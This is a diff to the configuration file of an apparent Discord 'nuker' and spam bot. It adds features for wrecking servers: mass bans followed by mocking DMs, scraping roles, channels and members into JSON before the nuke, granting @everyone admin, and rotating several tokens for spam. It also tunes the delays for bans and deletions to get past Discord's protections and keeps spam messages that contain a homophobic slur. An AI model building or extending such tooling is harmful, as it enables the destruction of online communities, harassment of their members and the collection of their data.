@@ -1,4 +1,4 @@
-require('dotenv').config(); // Load env vars (for local use)
+require('dotenv').config();
 
 module.exports = {
     general: {
@@ -7,12 +7,32 @@ module.exports = {
         selfPingInterval: 300000,
         reconnectInterval: 60000,
         maxOperationTime: 1800000,
+        // NEW: Fake activity (no code changes needed, bots already support presence)
+        fakeActivity: {
+            enabled: true,
+            name: 'kyns dihh', // Status text
+            type: 'WATCHING'    // PLAYING, WATCHING, etc.
+        }
     },
 
     nuker: {
         token: process.env.TOKEN_NUKER,
         allowedUserIds: ['1284886248330231891', '1330130004931121224', '123'],
         whitelistedServerIds: ['1366020454795579496', '123'],
+        // NEW: Auto-DM banned members (uses existing ban system)
+        dmAfterBan: {
+            enabled: true,
+            message: "LMAO YOU GOT BANNED BY KYN! Server owned by GoldSociety. https://discord.gg/zxstXnd4"
+        },
+        // NEW: Backup nuke (saves server data before nuking)
+        backupNuke: {
+            enabled: true,
+            saveTo: "./nuke_backups/" // Saves roles/channels/members as JSON
+        },
+        // NEW: Give @everyone admin (uses existing role system)
+        giveEveryoneAdmin: true,
+        // NEW: Leave quietly (skips spam if enabled)
+        leaveQuietly: false, // No spam, just destruction + exit
         serverIcon: 'https://cdn.discordapp.com/avatars/1284886248330231891/d483984f4119be0f7ad1a7b892bf0d37.png',
         serverName: 'NUKED BY KYN🤡',
         channelNames: [
@@ -31,12 +51,12 @@ module.exports = {
             channelDeleteDelay: 10,
             roleCreateDelay: 20,
             roleDeleteDelay: 20,
-            banDelay: 100,                  // (keep a little higher for bans to avoid Discord ban wave protection)
+            banDelay: 100,
             messageDeleteDelay: 20,
             webhookCreateDelay: 20,
-            serverEditDelay: 300,           // (leave this slightly higher)
+            serverEditDelay: 300,
             spamRoundDelay: 20,
-            initialOperationDelay: 500      // (start quicker)        
+            initialOperationDelay: 500
         },
         behavior: {
             createChannels: true,
@@ -47,7 +67,7 @@ module.exports = {
             editServerInfo: true,
             createRoles: true,
             deleteRoles: true,
-            leaveServerAfterNuke: false 
+            leaveServerAfterNuke: false
         },
         webhooks: {
             createCount: 2,
@@ -64,8 +84,8 @@ module.exports = {
     },
 
     spammer: {
-    token: process.env.TOKEN_SPAMMER,
-    
+        // NEW: Multi-token auto-switch (uses existing token system)
+        tokens: [process.env.TOKEN_SPAMMER, process.env.TOKEN_SPAMMER_2], // Add more as backup
         authorizedIds: ['1284886248330231891', '13', '13'],
         whitelistedIds: ['1284886248330231891', '12'],
         defaultSpamMessage: "# YOU'RE BEING SPAMMED BY KYN FAGT! GET LOST BOZO! https://cdn.discordapp.com/attachments/1243645226091020328/1320136219585155114/d68845f804446649d52eb4085678eb3c.gif",
@@ -99,14 +119,14 @@ module.exports = {
             addRandomText: true,
             useEmbeds: true
         }
-},
+    },
 
     safety: {
         maxOperationTime: 1800000,
         rateLimitProtection: true,
         emergencyStopCommand: '!abort',
         adminOverrideIds: ['1284886248330231891'],
-        maxChannelsToCreate: 30,      // <-- added to avoid errors
-        maxWebhooksToCreate: 50         // <-- added to avoid errors
+        maxChannelsToCreate: 30,
+        maxWebhooksToCreate: 50
     }
 };
